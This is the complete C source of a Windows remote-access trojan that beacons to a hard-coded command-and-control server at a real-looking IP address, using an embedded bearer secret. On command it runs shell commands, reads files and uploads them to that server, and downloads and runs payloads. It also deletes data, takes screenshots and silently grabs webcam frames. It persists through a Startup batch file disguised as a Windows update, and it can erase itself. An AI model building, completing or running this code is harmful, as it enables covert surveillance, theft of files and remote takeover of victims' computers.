#define _WIN32_WINNT 0x0600
#include <winsock2.h>
#include <windows.h>
#include <vfw.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "vfw32.lib")

#define C2_HOST    "194.146.38.81"
#define C2_PORT    8080
#define C2_PATH    "/c2/api.php"
#define SECRET     "ff5067f4026f811ee3cce00c9c62e07f340a31bcf7cc16d976cb88931a1ce5b6b77a14cf8cd52d349548161be9e799d47b0a8e3f4d619853ca105287e891ca27"

static char g_uuid[64];
static char g_hostname[64];
static char g_username[64];
static char g_os_info[256];
static wchar_t g_uuid_path[MAX_PATH];

static const char *b64alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *b64_encode(const BYTE *data, DWORD len) {
    DWORD out = (len + 2) / 3 * 4;
    char *r = (char*)malloc(out + 1);
    if (!r) return NULL;
    DWORD i, j = 0;
    for (i = 0; i < len; i += 3) {
        DWORD v = (DWORD)data[i] << 16;
        if (i+1 < len) v |= (DWORD)data[i+1] << 8;
        if (i+2 < len) v |= data[i+2];
        r[j++] = b64alphabet[(v>>18)&0x3f];
        r[j++] = b64alphabet[(v>>12)&0x3f];
        r[j++] = (i+1 < len) ? b64alphabet[(v>>6)&0x3f] : '=';
        r[j++] = (i+2 < len) ? b64alphabet[v&0x3f] : '=';
    }
    r[j] = 0;
    return r;
}

static char *json_escape(const char *s) {
    size_t cap = strlen(s) * 2 + 3;
    char *r = (char*)malloc(cap);
    if (!r) return NULL;
    char *d = r; *d++ = '"';
    while (*s) {
        if (*s == '"' || *s == '\\') *d++ = '\\';
        if (*s == '\n') { *d++ = '\\'; *d++ = 'n'; s++; continue; }
        if (*s == '\r') { *d++ = '\\'; *d++ = 'r'; s++; continue; }
        if (*s == '\t') { *d++ = '\\'; *d++ = 't'; s++; continue; }
        *d++ = *s++;
    }
    *d++ = '"'; *d = 0;
    return r;
}

static SOCKET connect_to_c2(void) {
    WSADATA wd;
    if (WSAStartup(MAKEWORD(2,2), &wd) != 0) return INVALID_SOCKET;
    struct hostent *he = gethostbyname(C2_HOST);
    if (!he) { WSACleanup(); return INVALID_SOCKET; }
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return INVALID_SOCKET; }
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s); WSACleanup(); return INVALID_SOCKET;
    }
    return s;
}

static void close_conn(SOCKET s) {
    closesocket(s);
    WSACleanup();
}

static DWORD recv_all(SOCKET s, char *buf, DWORD cap) {
    DWORD total = 0;
    int r;
    while ((r = recv(s, buf + total, cap - total - 1, 0)) > 0) total += r;
    buf[total] = 0;
    return total;
}

static char *http_post(const char *action, const char *body) {
    SOCKET s = connect_to_c2();
    if (s == INVALID_SOCKET) return NULL;

    DWORD blen = body ? (DWORD)strlen(body) : 0;
    char req[65536];
    int n = snprintf(req, sizeof(req),
        "POST %s?action=%s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Authorization: Bearer %s\r\n"
        "Content-Length: %lu\r\n"
        "Connection: close\r\n"
        "\r\n%s",
        C2_PATH, action, C2_HOST, C2_PORT, SECRET, (unsigned long)blen, body ? body : "");

    send(s, req, n, 0);
    char resp[65536];
    recv_all(s, resp, sizeof(resp));
    close_conn(s);

    char *hdr_end = strstr(resp, "\r\n\r\n");
    if (!hdr_end) return NULL;
    return _strdup(hdr_end + 4);
}

// GET a binary file from the C2 server, returns raw bytes after headers
// Caller must free returned buffer and set *out_len
static BYTE *http_get_binary(const char *action_and_query, DWORD *out_len) {
    SOCKET s = connect_to_c2();
    if (s == INVALID_SOCKET) return NULL;

    char req[4096];
    int n = snprintf(req, sizeof(req),
        "GET %s?%s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Authorization: Bearer %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        C2_PATH, action_and_query, C2_HOST, C2_PORT, SECRET);

    send(s, req, n, 0);

    DWORD cap = 131072, total = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { close_conn(s); return NULL; }

    int r;
    while ((r = recv(s, buf + total, cap - total - 1, 0)) > 0) {
        total += r;
        if (cap - total < 4096) {
            cap *= 2;
            char *tmp = (char*)realloc(buf, cap);
            if (!tmp) { free(buf); close_conn(s); return NULL; }
            buf = tmp;
        }
    }
    buf[total] = 0;
    close_conn(s);

    char *hdr_end = strstr(buf, "\r\n\r\n");
    if (!hdr_end) { free(buf); return NULL; }

    DWORD body_start = (DWORD)(hdr_end - buf + 4);
    DWORD body_len = total - body_start;
    if (body_len == 0) { free(buf); return NULL; }

    BYTE *data = (BYTE*)malloc(body_len);
    if (!data) { free(buf); return NULL; }
    memcpy(data, buf + body_start, body_len);
    *out_len = body_len;
    free(buf);
    return data;
}

static void load_uuid(void) {
    char path[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", path, sizeof(path));
    strcat(path, "\\.c2_beacon_id");
    MultiByteToWideChar(CP_UTF8, 0, path, -1, g_uuid_path, MAX_PATH);

    HANDLE h = CreateFileW(g_uuid_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD r;
        ReadFile(h, g_uuid, sizeof(g_uuid)-1, &r, NULL);
        g_uuid[r] = 0;
        CloseHandle(h);
        for (char *p = g_uuid; *p; p++) if (*p == '\r' || *p == '\n') { *p = 0; break; }
        if (g_uuid[0]) return;
    }
    sprintf(g_uuid, "%08x-%04x-%04x-%04x-%04x%08x",
        (unsigned)rand(), (unsigned)rand() & 0xffff,
        (unsigned)(rand() & 0x0fff)|0x4000,
        (unsigned)(rand() & 0x3fff)|0x8000,
        (unsigned)(rand() & 0xffff), (unsigned)rand());
    HANDLE h2 = CreateFileW(g_uuid_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h2 != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h2, g_uuid, (DWORD)strlen(g_uuid), &w, NULL);
        CloseHandle(h2);
    }
}

static void get_sysinfo(void) {
    DWORD sz = sizeof(g_hostname);
    GetComputerNameA(g_hostname, &sz);
    sz = sizeof(g_username);
    GetUserNameA(g_username, &sz);
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        char buf[256]; DWORD t = sizeof(buf), type;
        if (RegQueryValueExA(hk, "ProductName", NULL, &type, (BYTE*)buf, &t) == ERROR_SUCCESS)
            strncpy(g_os_info, buf, sizeof(g_os_info)-1);
        RegCloseKey(hk);
    }
    if (!g_os_info[0]) strcpy(g_os_info, "Windows");
}

static BOOL is_admin(void) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return FALSE;
    TOKEN_ELEVATION te; DWORD sz = sizeof(te);
    BOOL ok = GetTokenInformation(hToken, TokenElevation, &te, sz, &sz);
    CloseHandle(hToken);
    return ok && te.TokenIsElevated;
}

static char *get_ip(void) {
    WSADATA wd;
    if (WSAStartup(MAKEWORD(2,2), &wd) != 0) return NULL;
    char host[256]; gethostname(host, sizeof(host));
    struct hostent *he = gethostbyname(host);
    char *ip = NULL;
    if (he && he->h_addr_list[0]) {
        ip = (char*)malloc(64);
        if (ip) strcpy(ip, inet_ntoa(*(struct in_addr*)he->h_addr_list[0]));
    }
    WSACleanup();
    return ip;
}

// Convert HBITMAP to BMP bytes, return base64
static char *bitmap_to_b64(HBITMAP hbm) {
    BITMAP bm;
    GetObject(hbm, sizeof(bm), &bm);
    if (!bm.bmWidth || !bm.bmHeight) return NULL;

    BITMAPINFOHEADER bi = { sizeof(bi), bm.bmWidth, bm.bmHeight, 1, 32, 0, 0, 0, 0, 0 };
    DWORD pitch = bm.bmWidth * 4;
    DWORD pix_size = pitch * bm.bmHeight;
    BYTE *pixels = (BYTE*)malloc(pix_size);
    if (!pixels) return NULL;

    HDC hdc = GetDC(NULL);
    GetDIBits(hdc, hbm, 0, bm.bmHeight, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    // BMP file: 14 byte header + BITMAPINFOHEADER + pixels
    DWORD hdr_size = 14 + sizeof(BITMAPINFOHEADER);
    DWORD total = hdr_size + pix_size;
    BYTE *bmp = (BYTE*)malloc(total);
    if (!bmp) { free(pixels); return NULL; }

    // BMP file header
    bmp[0] = 'B'; bmp[1] = 'M';
    *(DWORD*)(bmp+2) = total;
    *(DWORD*)(bmp+6) = 0;
    *(DWORD*)(bmp+10) = hdr_size;
    memcpy(bmp+14, &bi, sizeof(BITMAPINFOHEADER));
    // flip vertically (BMP is bottom-up)
    for (int y = 0; y < bm.bmHeight; y++)
        memcpy(bmp + hdr_size + (bm.bmHeight-1-y)*pitch, pixels + y*pitch, pitch);

    char *b64 = b64_encode(bmp, total);
    free(bmp);
    free(pixels);
    return b64;
}

static char *post_image(const char *type, HBITMAP hbm) {
    char *b64 = bitmap_to_b64(hbm);
    if (!b64) return _strdup("[-] Image encode failed");

    char *esc_data = json_escape(b64);
    free(b64);
    if (!esc_data) return _strdup("[-] Escape failed");

    char *uuid_e = json_escape(g_uuid);
    if (!uuid_e) { free(esc_data); return _strdup("[-] OOM"); }

    char *body = (char*)malloc(strlen(esc_data) + strlen(uuid_e) + strlen(type) + 128);
    sprintf(body, "{\"beacon_uuid\":%s,\"type\":\"%s\",\"data\":%s}", uuid_e, type, esc_data);
    char *resp = http_post("media_upload", body);
    free(body); free(uuid_e); free(esc_data);

    char *result;
    if (resp && strstr(resp, "\"uploaded\"")) {
        result = (char*)malloc(64);
        sprintf(result, "[+] %s uploaded", type);
    } else {
        result = _strdup("[-] Upload failed");
    }
    free(resp);
    return result;
}

static char *take_screenshot(void) {
    HDC hdcScreen = GetDC(NULL);
    int w = GetDeviceCaps(hdcScreen, HORZRES);
    int h = GetDeviceCaps(hdcScreen, VERTRES);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
    SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    char *result = post_image("screenshot", hbm);

    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    return result;
}

static char *camera_capture(void) {
    OleInitialize(NULL);

    HWND hWndCap = capCreateCaptureWindowA("Capture", WS_CHILD|WS_DISABLED, 0, 0, 320, 240, NULL, NULL, 0, NULL);
    if (!hWndCap) { OleUninitialize(); return _strdup("[-] Camera: window creation failed"); }

    MSG msg;
    while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) DispatchMessage(&msg);
    Sleep(100);

    if (!SendMessage(hWndCap, WM_CAP_DRIVER_CONNECT, 0, 0)) {
        DestroyWindow(hWndCap); OleUninitialize();
        return _strdup("[-] No camera connected");
    }

    Sleep(300);
    SendMessage(hWndCap, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
    Sleep(200);
    SendMessage(hWndCap, WM_CAP_EDIT_COPY, 0, 0);
    Sleep(100);

    char *result = NULL;
    if (OpenClipboard(NULL)) {
        HBITMAP hbm = (HBITMAP)GetClipboardData(CF_BITMAP);
        if (hbm) result = post_image("cam", hbm);
        CloseClipboard();
    }

    SendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    DestroyWindow(hWndCap);
    OleUninitialize();

    if (!result) result = _strdup("[-] Camera capture failed");
    return result;
}

static char *exec_shell(const char *cmd) {
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return _strdup("[-] Pipe failed");
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite); CloseHandle(hRead);
        return _strdup("[-] CreateProcess failed");
    }
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, 10000);

    DWORD avail = GetFileSize(hRead, NULL);
    char *out;
    if (avail > 0 && avail < 65536) {
        out = (char*)malloc(avail+1);
        DWORD read;
        if (ReadFile(hRead, out, avail, &read, NULL)) out[read] = 0;
        else { free(out); out = _strdup("(no output)"); }
    } else {
        char small[128]; DWORD read;
        if (ReadFile(hRead, small, sizeof(small)-1, &read, NULL) && read > 0) {
            small[read] = 0; out = _strdup(small);
        } else out = _strdup("(no output)");
    }
    CloseHandle(hRead);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return out;
}

static char *browse_dir(const char *path) {
    char search[MAX_PATH];
    ExpandEnvironmentStringsA(path && path[0] ? path : "C:\\", search, sizeof(search));
    size_t slen = strlen(search);
    if (slen > 0 && search[slen-1] == '\\') strcat(search, "*");
    else strcat(search, "\\*");

    char *buf = (char*)malloc(65536);
    if (!buf) return _strdup("{\"error\":\"OOM\"}");
    strcpy(buf, "{\"files\":[");
    int first = 1;

    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(search, &fd);
    if (hf == INVALID_HANDLE_VALUE) { free(buf); return _strdup("{\"error\":\"Path not found\"}"); }

    do {
        if (!first) strcat(buf, ","); first = 0;
        SYSTEMTIME st; FILETIME ftLocal;
        FileTimeToLocalFileTime(&fd.ftLastWriteTime, &ftLocal);
        FileTimeToSystemTime(&ftLocal, &st);
        char entry[4096];
        snprintf(entry, sizeof(entry),
            "{\"name\":\"%s\",\"type\":\"%s\",\"size\":%lu,\"modified\":\"%04d-%02d-%02dT%02d:%02d:%02d\"}",
            fd.cFileName, (fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)?"dir":"file",
            fd.nFileSizeLow, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        strcat(buf, entry);
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    strcat(buf, "]}");
    return buf;
}

static char *read_file(const char *path) {
    char exp[MAX_PATH];
    ExpandEnvironmentStringsA(path ? path : "", exp, sizeof(exp));
    HANDLE h = CreateFileA(exp, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return _strdup("[-] File not found");
    DWORD sz = GetFileSize(h, NULL);
    if (sz > 10485760) { CloseHandle(h); return _strdup("[-] File too large (>10MB)"); }
    char *buf = (char*)malloc(sz+1);
    DWORD r;
    if (!ReadFile(h, buf, sz, &r, NULL)) { free(buf); CloseHandle(h); return _strdup("[-] Read failed"); }
    buf[r] = 0; CloseHandle(h);

    int printable = 1;
    for (DWORD i = 0; i < r && printable; i++)
        if (buf[i] && buf[i] < 32 && buf[i] != '\r' && buf[i] != '\n' && buf[i] != '\t')
            printable = 0;
    if (printable) return buf;
    char *b64 = b64_encode((BYTE*)buf, r);
    free(buf);
    return b64 ? b64 : _strdup("[-] B64 encode failed");
}

static char *cmd_download(const char *arg) {
    // download <file_id> <output_path>
    char file_id[256], out_path[MAX_PATH];
    if (sscanf(arg, "%255s %1023s", file_id, out_path) < 2)
        return _strdup("[-] usage: download <file_id> <output_path>");

    char query[512];
    snprintf(query, sizeof(query), "action=file&id=%s", file_id);

    DWORD len = 0;
    BYTE *data = http_get_binary(query, &len);
    if (!data) return _strdup("[-] Download failed (no data)");

    char exp[MAX_PATH];
    ExpandEnvironmentStringsA(out_path, exp, sizeof(exp));

    HANDLE h = CreateFileA(exp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) { free(data); return _strdup("[-] Cannot write output path"); }

    DWORD w;
    WriteFile(h, data, len, &w, NULL);
    CloseHandle(h);

    char *result = (char*)malloc(strlen(exp) + 32);
    sprintf(result, "[+] Downloaded %lu bytes to %s", (unsigned long)len, exp);
    free(data);
    return result;
}

static char *cmd_delete(const char *arg) {
    if (!arg || !arg[0]) return _strdup("[-] usage: delete <path>");
    char exp[MAX_PATH];
    ExpandEnvironmentStringsA(arg, exp, sizeof(exp));
    if (DeleteFileA(exp)) return _strdup("[+] Deleted");
    // try removing directory
    if (RemoveDirectoryA(exp)) return _strdup("[+] Directory removed");
    // try recursive removal via shell
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "rmdir /s /q \"%s\"", exp);
    return exec_shell(cmd);
}

static char *cmd_run(const char *arg) {
    // run <path> [args...]
    if (!arg || !arg[0]) return _strdup("[-] usage: run <path> [args]");

    char cmdline[4096];
    // If args contain spaces, assume first token is the path
    const char *space = strchr(arg, ' ');
    if (space) {
        char path[MAX_PATH];
        size_t plen = (size_t)(space - arg);
        strncpy(path, arg, plen); path[plen] = 0;
        snprintf(cmdline, sizeof(cmdline), "%s %s", path, space + 1);
    } else {
        strncpy(cmdline, arg, sizeof(cmdline) - 1);
    }

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    PROCESS_INFORMATION pi;

    char expanded[4096];
    ExpandEnvironmentStringsA(cmdline, expanded, sizeof(expanded));

    if (!CreateProcessA(NULL, expanded, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        return _strdup("[-] Failed to execute");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return _strdup("[+] Process started");
}

static char *upload_file(const char *path) {
    char exp[MAX_PATH];
    ExpandEnvironmentStringsA(path ? path : "", exp, sizeof(exp));
    HANDLE h = CreateFileA(exp, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return _strdup("[SKIP] file not found");
    DWORD sz = GetFileSize(h, NULL);
    BYTE *data = (BYTE*)malloc(sz);
    DWORD r;
    if (!ReadFile(h, data, sz, &r, NULL)) { free(data); CloseHandle(h); return _strdup("[ERROR] Read failed"); }
    CloseHandle(h);

    char *b64 = b64_encode(data, r);
    free(data);
    if (!b64) return _strdup("[ERROR] B64 failed");
    char *esc_data = json_escape(b64);
    free(b64);
    if (!esc_data) return _strdup("[ERROR] Escape failed");

    const char *fname = strrchr(exp, '\\');
    fname = fname ? fname+1 : exp;
    char *esc_name = json_escape(fname);
    char *uuid_e = json_escape(g_uuid);

    char *body = (char*)malloc(strlen(esc_data)+strlen(esc_name)+strlen(uuid_e)+128);
    sprintf(body, "{\"beacon_uuid\":%s,\"filename\":%s,\"data\":%s}", uuid_e, esc_name, esc_data);
    char *resp = http_post("file", body);
    free(body); free(uuid_e); free(esc_name); free(esc_data);

    char *result = (char*)malloc(strlen(fname)+32);
    if (resp && strstr(resp, "\"uploaded\"")) sprintf(result, "[UPLOADED] %s", fname);
    else sprintf(result, "[FAILED] %s", fname);
    free(resp);
    return result;
}

static char *persist(void) {
    if (!is_admin()) return _strdup("[-] Admin required");
    char path[MAX_PATH];
    ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.bat", path, sizeof(path));
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    char content[4096];
    snprintf(content, sizeof(content), "@echo off\r\nstart /b \"\" \"%s\"\r\n", exe_path);
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return _strdup("[-] Persist failed");
    DWORD w;
    WriteFile(h, content, (DWORD)strlen(content), &w, NULL);
    CloseHandle(h);
    return _strdup("[+] Persistence added");
}

static void self_destruct(void) {
    DeleteFileW(g_uuid_path);
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    char bat_path[MAX_PATH];
    snprintf(bat_path, sizeof(bat_path), "%s.bat", exe_path);
    HANDLE h = CreateFileA(bat_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        char content[4096];
        snprintf(content, sizeof(content),
            ":loop\r\n"
            "del \"%s\" 2>nul\r\n"
            "if exist \"%s\" goto loop\r\n"
            "del \"%%~f0\"\r\n", exe_path, exe_path);
        DWORD w;
        WriteFile(h, content, (DWORD)strlen(content), &w, NULL);
        CloseHandle(h);
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessA(NULL, bat_path, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    ExitProcess(0);
}

static char *exec_task(const char *cmd) {
    if (!cmd || !cmd[0]) return _strdup("[ERROR] empty command");
    char buf[4096];
    strncpy(buf, cmd, sizeof(buf)-1); buf[sizeof(buf)-1] = 0;
    char *sp = strchr(buf, ' ');
    size_t alen = sp ? (size_t)(sp-buf) : strlen(buf);
    char action[256];
    strncpy(action, buf, alen); action[alen] = 0;
    const char *arg = sp ? sp+1 : "";

    if (!strcmp(action, "shell")) return exec_shell(arg);
    if (!strcmp(action, "browse")) return browse_dir(arg);
    if (!strcmp(action, "read")) return read_file(arg);
    if (!strcmp(action, "upload")) return upload_file(arg);
    if (!strcmp(action, "download")) return cmd_download(arg);
    if (!strcmp(action, "run")) return cmd_run(arg);
    if (!strcmp(action, "delete")) return cmd_delete(arg);
    if (!strcmp(action, "screenshot")) return take_screenshot();
    if (!strcmp(action, "cam")) return camera_capture();
    if (!strcmp(action, "persist")) return persist();
    if (!strcmp(action, "selfdestruct")) { self_destruct(); return _strdup("[SELFDESTRUCT]"); }
    return exec_shell(cmd);
}

static char *extract_str(const char *src, const char *key) {
    const char *p = strstr(src, key);
    if (!p) return NULL;
    p = strchr(p, ':');
    if (!p) return NULL;
    p = strchr(p, '"');
    if (!p) return NULL;
    p++;
    const char *end = strchr(p, '"');
    if (!end) return NULL;
    size_t len = (size_t)(end-p);
    char *val = (char*)malloc(len+1);
    if (!val) return NULL;
    strncpy(val, p, len); val[len] = 0;
    char *d = val;
    for (char *s = val; *s; s++) {
        if (*s == '\\' && *(s+1)) { s++; *d++ = *s; }
        else *d++ = *s;
    }
    *d = 0;
    return val;
}

static int parse_int(const char *s) {
    while (*s && (*s < '0' || *s > '9')) s++;
    if (*s < '0' || *s > '9') return 0;
    int n = 0;
    while (*s >= '0' && *s <= '9') { n = n*10 + (*s-'0'); s++; }
    return n;
}

int main(void) {
    srand((unsigned)GetTickCount());
    load_uuid();
    get_sysinfo();

    while (1) {
        char *ip = get_ip();

        char _priv[64], _pid[64], _ips[128];
        snprintf(_priv, sizeof(_priv), "\"privilege\":\"%s\"", is_admin() ? "admin" : "user");
        snprintf(_pid, sizeof(_pid), "\"pid\":%d", GetCurrentProcessId());

        // build JSON body piece by piece (max 8 fields)
        char body[4096];
        char *uuid_e = json_escape(g_uuid);
        char *host_e = json_escape(g_hostname);
        char *os_e = json_escape(g_os_info);
        char *user_e = json_escape(g_username);
        char *ip_json = ip ? json_escape(ip) : NULL;

        snprintf(body, sizeof(body),
            "{\"uuid\":%s,\"hostname\":%s,\"os\":%s,\"username\":%s,%s,%s%s%s}",
            uuid_e, host_e, os_e, user_e, _priv, _pid,
            ip_json ? ",\"ip\":" : "", ip_json ? ip_json : "");

        free(uuid_e); free(host_e); free(os_e); free(user_e);
        free(ip_json); free(ip);

        int sleep_sec = 30;
        char *resp = http_post("beacon", body);

        if (resp) {
            const char *ts = strstr(resp, "\"tasks\"");
            if (ts && (ts = strchr(ts, '['))) {
                while (*ts && *ts != ']') {
                    const char *os = strchr(ts, '{');
                    if (!os) break;
                    const char *oe = strchr(os, '}');
                    if (!oe) break;
                    size_t olen = oe-os+1;
                    char *task = (char*)malloc(olen+1);
                    strncpy(task, os, olen); task[olen] = 0;

                    char *tid = extract_str(task, "\"id\"");
                    char *tcmd = extract_str(task, "\"command\"");
                    free(task);

                    if (tid && tcmd) {
                        char *output = exec_task(tcmd);
                        if (output) {
                            char *out_e = json_escape(output);
                            free(output);
                            if (out_e) {
                                char *uuid_e2 = json_escape(g_uuid);
                                if (uuid_e2) {
                                    char rb[65536];
                                    snprintf(rb, sizeof(rb),
                                        "{\"task_id\":%s,\"beacon_uuid\":%s,\"output\":%s,\"status\":\"completed\"}",
                                        tid, uuid_e2, out_e);
                                    char *rr = http_post("result", rb);
                                    free(rr);
                                    free(uuid_e2);
                                }
                                free(out_e);
                            }
                        }
                    }
                    free(tid); free(tcmd);
                    ts = oe + 1;
                }
            }
            const char *sl = strstr(resp, "\"sleep\"");
            if (sl) { sleep_sec = parse_int(sl+6); if (sleep_sec < 1) sleep_sec = 30; if (sleep_sec > 3600) sleep_sec = 3600; }
            free(resp);
        }
        Sleep(sleep_sec * 1000);
    }
}
